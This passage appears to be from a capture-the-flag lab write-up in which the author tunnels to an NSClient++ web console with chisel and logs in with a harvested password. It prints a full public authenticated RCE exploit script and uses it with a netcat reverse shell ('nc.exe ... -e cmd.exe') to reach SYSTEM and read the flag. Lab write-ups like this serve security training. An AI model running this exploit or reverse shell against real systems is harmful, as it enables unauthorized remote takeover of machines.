• password = NjoCYfnHSohg7Q6g
• allowed hosts = 127.0.0.1

To be sure, I tried to logon to the system without a tunnel to the system.
![Image](/assets/img/WriteUp/ITSL/Back2Back/ITSL-Back2Back-4.png){: width="700" height="400" }

As aspected, I am not allowed to logon to the system.
To logon to the portal I can use a technique called tunneling. There are several tunneling and port forwarding techniques described on [hacktricks](https://book.hacktricks.xyz/tunneling-and-port-forwarding). In this scenario I would like to use chisel to build a tunnel to the Windows target. Via Google I had found a website with a great ex
I found a [website](https://infinitelogins.com/2020/12/11/tunneling-through-windows-machines-with-chisel/) through Google with a great explanation. 

To download Chisel, just navigate to the [Github page](https://github.com/jpillora/chisel/releases/tag/v1.7.3).
There should be two files downloaded. One for the target and one for the attacker machine. It is important to download the correct version, so be aware of the architecture of the system.
As soon as both files are downloaded to the system I used gunzip to extract them with the following command: **gunzip -d *.gz**

On my Kali machine, I have to make the application executable, this can be done with the command: **chmod +x chisel**.

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
┌──(eMVee@kali)-[~/Documents/Back2Back]
└─$ chmod +x chisel 
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Now I have to start the Chisel server on the Kali machine with **./chisel server --reverse --port 9002**.                                                                                                                    

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
┌──(eMVee@kali)-[~/Documents/Back2Back]
└─$ ./chisel server --reverse --port 9002
2021/11/09 14:46:12 server: Reverse tunnelling enabled
2021/11/09 14:46:12 server: Fingerprint Ckkxcnj4+/UTTbs50+YskdkMzmd05AxhcmwkgfcF5XI=
2021/11/09 14:46:12 server: Listening on http://0.0.0.0:9002
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Because I am still running my Python webser in the work directory of Back2Back I could download the file with a Powershell command: **Invoke-WebRequest -Uri http://10.0.2.15/chisel.exe -OutFile chisel.exe**.


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
PS C:\windows\temp> Invoke-WebRequest -Uri http://10.0.2.15/chisel.exe -OutFile chisel.exe
PS C:\windows\temp> dir


    Directory: C:\windows\temp


Mode                LastWriteTime     Length Name                              
----                -------------     ------ ----                              
-a---         11/9/2021   2:31 PM    8818688 chisel.exe                        
-a---         11/9/2021   2:08 PM    1924608 winPEASx64.exe    
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


After downloading the file to my target I could start Chisel on the target with the following command: **.\chisel.exe client 10.0.2.15:9002 R:8443:localhost:8443**.


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
PS C:\windows\temp> .\chisel.exe client 10.0.2.15:9002 R:8443:localhost:8443
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

By hitting enter after entering the command to start a tunnel to my Kali machine I had to check if the connection has been established.


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
┌──(eMVee@kali)-[~/Documents/Back2Back]
└─$ ./chisel server --reverse --port 9002
2021/11/09 14:46:12 server: Reverse tunnelling enabled
2021/11/09 14:46:12 server: Fingerprint Ckkxcnj4+/UTTbs50+YskdkMzmd05AxhcmwkgfcF5XI=
2021/11/09 14:46:12 server: Listening on http://0.0.0.0:9002
2021/11/09 14:56:52 server: session#1: tun: proxy#R:8443=>localhost:8443: Listening

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

It looks like the tunnel has been established, so I can try to open *http://loclahost:8443* via my browser.

To be sure, I tried to logon to the system without a tunnel to the system.
![Image](/assets/img/WriteUp/ITSL/Back2Back/ITSL-Back2Back-5.png){: width="700" height="400" }

So the tunnel is working and the logon page of NSClient++ is shown to me. Now I can try to logon with the password found in the nsclient.ini file.
![Image](/assets/img/WriteUp/ITSL/Back2Back/ITSL-Back2Back-6.png){: width="700" height="400" }

After entering the password I was logged on to the system as admin. I browsed through the website and was thinking that there should be an exploit available which has automated the vulnerability. I searched on Google for “[NSClient ++ exploit github](https://github.com/AndyFeiLi/nsclient-0.5.2.35-RCE-exploit)” and I have found a few exploits. I decided to clone the exploit from AndyFeili after reading the exploit on his Github page.




~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ba
┌──(eMVee@kali)-[~/Documents/Back2Back]
└─$ git clone https://github.com/AndyFeiLi/nsclient-0.5.2.35-RCE-exploit.git
Cloning into 'nsclient-0.5.2.35-RCE-exploit'...
remote: Enumerating objects: 15, done.
remote: Counting objects: 100% (15/15), done.
remote: Compressing objects: 100% (14/14), done.
remote: Total 15 (delta 2), reused 0 (delta 0), pack-reused 0
Receiving objects: 100% (15/15), done.
Resolving deltas: 100% (2/2), done.
                                                                                                                    
┌──(eMVee@kali)-[~/Documents/Back2Back]
└─$ cd nsclient-0.5.2.35-RCE-exploit 
                                                                                                                    
┌──(eMVee@kali)-[~/Documents/Back2Back/nsclient-0.5.2.35-RCE-exploit]
└─$ ls
exploit.py  README.md
                                                                                                                    
┌──(eMVee@kali)-[~/Documents/Back2Back/nsclient-0.5.2.35-RCE-exploit]
└─$ cat README.md                              
# NSClient++ 0.5.2.35 - Privilege Escalation

https://www.exploit-db.com/exploits/46802

EDB-ID:46802

https://www.youtube.com/watch?v=LPN6y3xLesI

example usage:

```
python3 exploit.py -t 127.0.0.1 -P 8443 -p ew2x6SsGTxjRwXOT -c 'nc -nv 10.10.14.3 1443 -e cmd.exe'
```
                                                                                                                    
┌──(eMVee@kali)-[~/Documents/Back2Back/nsclient-0.5.2.35-RCE-exploit]
└─$ cat exploit.py 
#!/usr/bin/env python3

import requests
from bs4 import BeautifulSoup as bs
import urllib3
import json
import sys
import random
import string
import time
import argparse
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def generateName():

  letters = string.ascii_lowercase + string.ascii_uppercase
  return ''.join(random.choice(letters) for i in range(random.randint(8,13)))

def printStatus(message, msg_type):

  C_YELLOW = '\033[1;33m'
  C_RESET = '\033[0m'
  C_GREEN = '\033[1;32m'
  C_RED = '\033[1;31m'

  if msg_type == "good":
    green_plus = C_GREEN + "[+]" + C_RESET 
    string = green_plus + " " + message

  elif msg_type == "info":
    yellow_ex = C_YELLOW + "[!]" + C_RESET
    string = yellow_ex + " " + message
  
  elif msg_type == "bad":
    red_minus = C_RED + "[-]" + C_RESET
    string = red_minus + " " + message

  print(string)

def configurePayload(session, cmd, key):

  printStatus("Configuring Script with Specified Payload . . .", "info")
  endpoint = "/settings/query.json"
  node = { "path" : "/settings/external scripts/scripts",
     "key" : key } 
  value = { "string_data" :  cmd }
  update = { "node" : node , "value" : value }
  payload = [ { "plugin_id" : "1234",
        "update" :  update } ] 
  json_data = { "type" : "SettingsRequestMessage", "payload" : payload }

  out = session.post(url = base_url + endpoint, json=json_data, verify=False)
  if "STATUS_OK" not in str(out.content):
    printStatus("Error configuring payload. Hit error at: "  + endpoint, "bad")
    sys.exit(1)

  printStatus("Added External Script (name: " + key + ")", "good")
  time.sleep(3)
  printStatus("Saving Configuration . . .", "info")
  header = { "version" : "1" }
  payload = [ { "plugin_id" : "1234", "control" : { "command" : "SAVE" }} ]
  json_data = { "header" : header, "type" : "SettingsRequestMessage", "payload" : payload }
  
  session.post(url = base_url + endpoint, json=json_data, verify=False)  

def reloadConfig(session):

  printStatus("Reloading Application . . .", "info")
  endpoint = "/core/reload"
  session.get(url = base_url + endpoint, verify=False)
  
  # Wait until the application successfully reloads by making a request
  # every 10 seconds until it responds.
  printStatus("Waiting for Application to reload . . .", "info")
  time.sleep(10)
  response = False
  count = 0 
  while not response:
    try:
      out = session.get(url = base_url, verify=False, timeout=10)
      if len(out.content) > 0:
        response = True
    except:
      count += 1
      if count > 10000000000000000000000000000:
        printStatus("Application failed to reload. Nice DoS exploit! /s", "bad")
        sys.exit(1)
      else:
        continue  

def triggerPayload(session, key):

  printStatus("Triggering payload, should execute shortly . . .", "info")
  endpoint = "/query/" + key
  try:
    session.get(url = base_url + endpoint, verify=False, timeout=10)
  except requests.exceptions.ReadTimeout:
    printStatus("Timeout exceeded. Assuming your payload executed . . .", "info")
    sys.exit(0)

def enableFeature(session):

  printStatus("Enabling External Scripts Module . . .", "info")
  endpoint = "/registry/control/module/load"
  params = { "name" : "CheckExternalScripts" }
  out = session.get(url = base_url + endpoint, params=params, verify=False)
  if "STATUS_OK" not in str(out.content):
    printStatus("Error enabling required feature. Hit error at: "  + endpoint, "bad")
    sys.exit(1)

def getAuthToken(session):

  printStatus("Obtaining Authentication Token . . .", "info")
  endpoint = "/auth/token"
  params = { "password" : password }
  auth = session.get(url = base_url + endpoint, params=params, verify=False)  
  if "auth token" in str(auth.content):
    j = json.loads(auth.content)
    authToken = j["auth token"]
    printStatus("Got auth token: " + authToken, "good")
    return authToken
  else:
    printStatus("Error obtaining auth token, is your password correct? Hit error at: "  + endpoint, "bad")
    sys.exit(1)
    
parser = argparse.ArgumentParser("NSClient++ 0.5.2.35 Authenticated RCE")
parser.add_argument('-t', nargs='?', metavar='target', help='Target IP Address.')
parser.add_argument('-P', nargs='?', metavar='port', help='Target Port.')
parser.add_argument('-p', nargs='?', metavar='password', help='NSClient++ Administrative Password.')
parser.add_argument('-c', nargs='?', metavar='command', help='Command to execute on target')
args = parser.parse_args()

if len(sys.argv) < 4:
  parser.print_help()
  sys.exit(1)

base_url = "https://" + args.t + ":" + args.P
printStatus("Targeting base URL " + base_url, "info")
password = args.p
cmd = args.c

s = requests.session()
token = getAuthToken(s)
s.headers.update({ "TOKEN" : token})

randKey = generateName()
enableFeature(s)
configurePayload(s, cmd, randKey)
reloadConfig(s)

token = getAuthToken(s)
s.headers.update({ "TOKEN" : token})

triggerPayload(s, randKey)

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Since this seems promising I decided to copy the netcat exectuable for Windows into my working directory. This way I can download it to the target via the Python web server. 


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
┌──(eMVee@kali)-[~/Documents/Back2Back]
└─$ cp /usr/share/windows-binaries/nc.exe .
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


To be successful in exploiting the exploit, the target must have a netcat executable. I download this on the target with the following command:  **Invoke-WebRequest -Uri http://10.0.2.15/nc.exe -OutFile nc.exe** while my Python webserver is running in the background of my Kali machine.



~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
PS C:\windows\temp> Invoke-WebRequest -Uri http://10.0.2.15/nc.exe -OutFile nc.exe
PS C:\windows\temp> dir


    Directory: C:\windows\temp


Mode                LastWriteTime     Length Name                              
----                -------------     ------ ----                              
-a---         11/9/2021   2:31 PM    8818688 chisel.exe                        
-a---         11/9/2021   3:14 PM      59392 nc.exe                            
-a---         11/9/2021   2:08 PM    1924608 winPEASx64.exe    
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~




Since the exploit is cloned to my machine and the netcat executable is on the target, I am able to start the exploit. But first I have to start a netcat listener so I could create a reverse shell.
The command I used for a netcat listerner looks like this: **nc -lvp 1234**


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
┌──(eMVee@kali)-[~]
└─$ nc -lvp 1234
listening on [any] 1234 ...
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


After starting the netcat listener, it just a matter of parsing the right information to the arguments. The command to run the exploit looks like this: **python3 exploit.py -t loclahost -P 8443 -p NjoCYfnHSohg7Q6g -c 'c:\windows\tempt\nc.exe -nv 10.0.2.15 1234 -e cmd.exe'**.


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
┌──(eMVee@kali)-[~/Documents/Back2Back/nsclient-0.5.2.35-RCE-exploit]
└─$ python3 exploit.py -t 127.0.0.1 -P 8443 -p NjoCYfnHSohg7Q6g -c 'c:\windows\temp\nc.exe -nv 10.0.2.15 1234 -e cmd.exe'
[!] Targeting base URL https://127.0.0.1:8443
[!] Obtaining Authentication Token . . .
[+] Got auth token: frAQBc8Wsa1xVPfvJcrgRYwTiizs2trQ
[!] Enabling External Scripts Module . . .
[!] Configuring Script with Specified Payload . . .
[+] Added External Script (name: lYyeHvneb)
[!] Saving Configuration . . .
[!] Reloading Application . . .
[!] Waiting for Application to reload . . .
[!] Obtaining Authentication Token . . .
[+] Got auth token: frAQBc8Wsa1xVPfvJcrgRYwTiizs2trQ
[!] Triggering payload, should execute shortly . . .
[!] Timeout exceeded. Assuming your payload executed . . .
                                                                                                                    
┌──(eMVee@kali)-[~/Documents/Back2Back/nsclient-0.5.2.35-RCE-exploit]
└─$ 

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

The exploit has been finished, so now I have to check mt netcat listener.



~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
┌──(eMVee@kali)-[~]
└─$ nc -lvp 1234 
listening on [any] 1234 ...
10.0.2.27: inverse host lookup failed: Unknown host
connect to [10.0.2.15] from (UNKNOWN) [10.0.2.27] 49315
Microsoft Windows [Version 6.2.9200]
(c) 2012 Microsoft Corporation. All rights reserved.

C:\Program Files\NSClient++>
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Looks like my reverse shell is working and so I'm successfully connected. Because I am the system user after running the expploit I browse to the Administrators home directory and open the desktop to capture the flag.


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
┌──(eMVee@kali)-[~]
└─$ nc -lvp 1234 
listening on [any] 1234 ...
10.0.2.27: inverse host lookup failed: Unknown host
connect to [10.0.2.15] from (UNKNOWN) [10.0.2.27] 49315
Microsoft Windows [Version 6.2.9200]
(c) 2012 Microsoft Corporation. All rights reserved.

C:\Program Files\NSClient++>cd c:\
cd c:\

c:\>cd Users
cd Users

c:\Users>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is B00F-4DBD

 Directory of c:\Users

11/04/2021  12:49 PM    <DIR>          .
11/04/2021  12:49 PM    <DIR>          ..
11/03/2021  09:03 PM    <DIR>          Administrator
07/26/2012  12:04 AM    <DIR>          Public
11/04/2021  07:51 PM    <DIR>          svc-postgres
               0 File(s)              0 bytes
               5 Dir(s)  19,006,255,104 bytes free

c:\Users>cd Administrator
cd Administrator

c:\Users\Administrator>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is B00F-4DBD

 Directory of c:\Users\Administrator

11/03/2021  09:03 PM    <DIR>          .
11/03/2021  09:03 PM    <DIR>          ..
11/03/2021  09:03 PM        59,016,632 apachehttpd.exe
10/22/2021  11:12 PM    <DIR>          Contacts
11/04/2021  08:39 PM    <DIR>          Desktop
11/02/2021  07:25 PM    <DIR>          Documents
10/22/2021  11:12 PM    <DIR>          Downloads
10/22/2021  11:12 PM    <DIR>          Favorites
10/22/2021  11:12 PM    <DIR>          Links
10/22/2021  11:12 PM    <DIR>          Music
10/22/2021  11:12 PM    <DIR>          Pictures
10/22/2021  11:12 PM    <DIR>          Saved Games
10/22/2021  11:12 PM    <DIR>          Searches
10/22/2021  11:12 PM    <DIR>          Videos
               1 File(s)     59,016,632 bytes
              13 Dir(s)  19,006,255,104 bytes free

c:\Users\Administrator>cd Desktop
cd Desktop

c:\Users\Administrator\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is B00F-4DBD

 Directory of c:\Users\Administrator\Desktop

11/04/2021  08:39 PM    <DIR>          .
11/04/2021  08:39 PM    <DIR>          ..
11/04/2021  08:41 PM                32 proof.txt
               1 File(s)             32 bytes
               2 Dir(s)  19,006,255,104 bytes free

c:\Users\Administrator\Desktop>
c:\Users\Administrator\Desktop>
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Just like with the flag of the low privileged user, I want to execute the three commands in one line so that everything is on my screen at once and I can take a screenshot of it. Instead of the ‘;’ character I use now the ‘&&' characters to run the commands one after the other. The command looks like: **type proof.txt&&hostname&&ipconfig**

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
c:\Users\Administrator\Desktop>type proof.txt&&hostname&&ipconfig
type proof.txt&&hostname&&ipconfig
d131dd02c5e6eec44004583eb8fb7f89
WIN-KBP5VDTN99V

Windows IP Configuration


Ethernet adapter Ethernet:

   Connection-specific DNS Suffix  . : 
   Link-local IPv6 Address . . . . . : fe80::90cb:5535:6a9:2242%12
   IPv4 Address. . . . . . . . . . . : 10.0.2.27
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 10.0.2.1

Tunnel adapter isatap.{47B0B4BC-37CE-446E-8F43-E7FC1C32D075}:

   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . : 

c:\Users\Administrator\Desktop>
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Although this machine isn't too difficult, I did have a challenge getting it to work in the Powershell part. 